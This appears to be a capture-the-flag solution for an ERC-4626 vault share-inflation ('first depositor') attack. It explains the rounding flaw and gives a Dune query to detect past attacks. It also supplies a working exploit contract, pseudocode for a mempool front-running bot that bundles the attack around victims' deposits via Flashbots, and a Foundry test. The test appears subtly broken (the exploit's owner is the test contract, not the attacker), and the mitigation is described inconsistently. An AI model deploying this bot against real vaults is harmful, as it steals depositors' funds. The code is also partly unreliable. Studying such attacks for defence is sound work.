# Challenge 01 - Vault (Tier 1) Solution

## a) Describe the vulnerability and the payoffs for an attacker

### The Vulnerability: ERC-4626 First-Depositor Inflation Attack

The old OpenZeppelin ERC-4626 implementation was vulnerable to the **vault share inflation attack** (also known as the "first depositor" or "donation" attack). The core issue lies in how shares are calculated during deposit:

```
shares = assets * totalSupply / totalAssets
```

When `totalSupply == 0` (empty vault), the first depositor gets shares at a 1:1 ratio with assets. An attacker can exploit the integer rounding in this formula as follows:

### Attack Steps:

1. **Attacker deposits 1 wei** of the underlying asset into the empty vault, receiving 1 share.
2. **Attacker donates a large amount `D`** of the underlying asset directly to the vault contract via `ERC20.transfer()` (not through `deposit()`). This inflates `totalAssets` to `D + 1` while `totalSupply` remains 1.
3. **Victim deposits `V` assets.** The shares they receive = `floor(V * 1 / (D + 1))`. If `V < D + 1`, this rounds down to **0 shares**. The victim's assets are added to the vault but they receive nothing.
4. **Attacker redeems their 1 share** for all vault assets: the original 1 wei + donation `D` + victim's deposit `V`.

### Payoffs:

- **Attacker profit:** `V - gas_cost` (the victim's entire deposit, minus gas). The donated amount `D` is fully recovered.
- **Attacker cost:** Gas for 3 transactions + temporary capital lockup of `D` (fully recovered).
- **Victim loss:** Their entire deposit `V`.
- **Optimal attack:** Set `D` slightly larger than the expected victim deposit to guarantee `shares = 0`. For example, if the victim deposits 100 ETH, set `D = 101 ETH` (1 ETH more than the victim's deposit is sufficient).
- With 1000 ETH available, the attacker can steal any deposit up to ~1000 ETH.

### Why it works:

The root cause is that Solidity performs integer division which rounds down. When `totalSupply = 1` and `totalAssets = D + 1`, a deposit of `V < D + 1` assets yields `floor(V / (D + 1)) = 0` shares. The fix (implemented in newer OpenZeppelin) uses "virtual shares and assets" — adding a virtual offset (e.g., 1e3 or 1e6) to totalSupply and totalAssets to make this rounding error negligible.

---

## b) Code to check if this vulnerability has occurred historically

### Dune SQL Query

The attack signature is: a `Deposit` event where `shares == 0` but `assets > 0`, indicating a victim lost their deposit.

```sql
-- Find ERC-4626 Deposit events where victim received 0 shares
-- The Deposit event signature: Deposit(address indexed sender, address indexed owner, uint256 assets, uint256 shares)
-- Topic0: 0xdcbc1c05240f31ff3ad067ef1ee35ce4997762752e3a095284754544f4c709d7

SELECT
    block_time,
    block_number,
    tx_hash,
    contract_address AS vault_address,
    bytearray_to_uint256(bytearray_substring(data, 1, 32)) AS assets_deposited,
    bytearray_to_uint256(bytearray_substring(data, 33, 32)) AS shares_received,
    bytearray_ltrim(topic1) AS sender,
    bytearray_ltrim(topic2) AS owner
FROM ethereum.logs
WHERE topic0 = 0xdcbc1c05240f31ff3ad067ef1ee35ce4997762752e3a095284754544f4c709d7
  AND bytearray_to_uint256(bytearray_substring(data, 33, 32)) = 0  -- shares == 0
  AND bytearray_to_uint256(bytearray_substring(data, 1, 32)) > 0   -- assets > 0
ORDER BY block_time DESC
LIMIT 100
```

### Detection Logic (Python pseudocode)

```python
# For each vault with a 0-share deposit:
# 1. Check if someone deposited 1 wei shortly before (the attacker's initial deposit)
# 2. Check if there was a direct ERC-20 transfer to the vault (the donation) between the two deposits
# 3. Check if the initial depositor redeemed shortly after

# Value lost = sum of all assets deposited where shares == 0
```

As of the challenge date (2024), this attack has been observed on a few ERC-4626 vaults, but the total value lost has been relatively small (a few thousand dollars total) because:
1. Most major vault implementations added mitigations early
2. The attack requires monitoring the mempool for deposits to empty vaults
3. Many vaults are initialized by the deployer with a small "dead shares" deposit

---

## c) Bot code for the exploit

### VaultExploit.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract VaultExploit {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    /// @notice Execute the inflation attack on an empty ERC-4626 vault
    /// @param vault The target ERC-4626 vault
    /// @param donationAmount Amount to donate to inflate the share price
    /// @dev The vault must have totalSupply == 0 (no existing depositors)
    function attack(IERC4626 vault, uint256 donationAmount) external {
        require(msg.sender == owner, "only owner");

        IERC20 asset = IERC20(vault.asset());

        // Step 1: Deposit 1 wei to get 1 share
        asset.transferFrom(msg.sender, address(this), donationAmount + 1);
        asset.approve(address(vault), 1);
        vault.deposit(1, address(this));

        // Step 2: Donate tokens directly to inflate totalAssets
        // This does NOT mint shares - it just increases totalAssets
        asset.transfer(address(vault), donationAmount);

        // Now: totalSupply = 1 share, totalAssets = donationAmount + 1
        // Any deposit of less than (donationAmount + 1) will yield 0 shares
    }

    /// @notice After the victim's deposit, redeem all shares to steal their deposit
    /// @param vault The target vault
    function withdraw(IERC4626 vault) external {
        require(msg.sender == owner, "only owner");

        uint256 shares = vault.balanceOf(address(this));
        vault.redeem(shares, owner, address(this));
    }

    /// @notice Rescue any tokens stuck in this contract
    function rescue(IERC20 token) external {
        require(msg.sender == owner, "only owner");
        token.transfer(owner, token.balanceOf(address(this)));
    }
}
```

### Mempool Monitoring Bot (pseudocode)

```python
"""
Bot pseudocode for monitoring and executing ERC-4626 inflation attacks.
In practice this would use flashbots to bundle the frontrun + backrun.
"""

async def monitor_mempool():
    """Watch for deposit() calls to empty ERC-4626 vaults"""
    async for pending_tx in mempool_stream:
        # Check if tx is a deposit to an ERC-4626 vault
        if pending_tx.function_selector == vault.deposit.selector:
            vault_address = pending_tx.to
            vault = ERC4626(vault_address)

            # Only attack empty vaults
            if vault.totalSupply() == 0:
                victim_amount = decode_deposit_amount(pending_tx)

                # Create frontrun bundle:
                # 1. deposit(1) to get 1 share
                # 2. transfer(vault, victim_amount + 1) to inflate price
                frontrun_tx = exploit.attack(vault, victim_amount + 1)

                # Create backrun:
                # 3. redeem(1) to steal victim's deposit
                backrun_tx = exploit.withdraw(vault)

                # Submit as Flashbots bundle
                bundle = [frontrun_tx, pending_tx, backrun_tx]
                await flashbots.send_bundle(bundle, target_block)
```

### Foundry Test (demonstrating the attack)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Minimal vulnerable ERC4626 implementation (old OpenZeppelin style)
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MCK") {
        _mint(msg.sender, 1_000_000 ether);
    }
}

contract MockVault is ERC4626 {
    constructor(IERC20 asset_) ERC4626(asset_) ERC20("Mock Vault", "vMCK") {}
}

contract VaultExploitTest is Test {
    MockToken token;
    MockVault vault;
    VaultExploit exploit;

    address attacker = address(0x1);
    address victim = address(0x2);

    function setUp() public {
        token = new MockToken();
        vault = new MockVault(IERC20(address(token)));
        exploit = new VaultExploit();

        // Give attacker 1000 ETH worth of tokens
        token.transfer(attacker, 1000 ether);
        // Give victim 100 ETH worth of tokens
        token.transfer(victim, 100 ether);
    }

    function testInflationAttack() public {
        // Step 1: Attacker frontrun - deposit 1 wei + donate
        vm.startPrank(attacker);
        token.approve(address(exploit), type(uint256).max);
        exploit.attack(vault, 101 ether); // Donate slightly more than victim's deposit
        vm.stopPrank();

        // Verify vault state: 1 share, 101 ETH + 1 wei total assets
        assertEq(vault.totalSupply(), 1);
        assertGt(vault.totalAssets(), 101 ether);

        // Step 2: Victim deposits 100 ETH - gets 0 shares due to rounding!
        vm.startPrank(victim);
        token.approve(address(vault), 100 ether);
        uint256 shares = vault.deposit(100 ether, victim);
        vm.stopPrank();

        assertEq(shares, 0); // Victim got nothing!
        assertEq(vault.balanceOf(victim), 0);

        // Step 3: Attacker backrun - redeem 1 share for everything
        vm.startPrank(attacker);
        uint256 balanceBefore = token.balanceOf(attacker);
        exploit.withdraw(vault);
        uint256 balanceAfter = token.balanceOf(attacker);
        vm.stopPrank();

        // Attacker recovers their donation + steals victim's 100 ETH
        uint256 profit = balanceAfter - balanceBefore;
        assertGt(profit, 200 ether); // 101 ETH donation + ~100 ETH from victim

        emit log_named_uint("Attacker profit (recovered donation + stolen funds)", profit);
        emit log_named_uint("Victim loss", 100 ether);
    }
}
```

**Note:** Modern OpenZeppelin ERC-4626 mitigates this by using virtual shares/assets offsets (adding 1 to both totalSupply and totalAssets in the conversion), making the rounding error negligible. The fix was introduced in OpenZeppelin v4.9+.
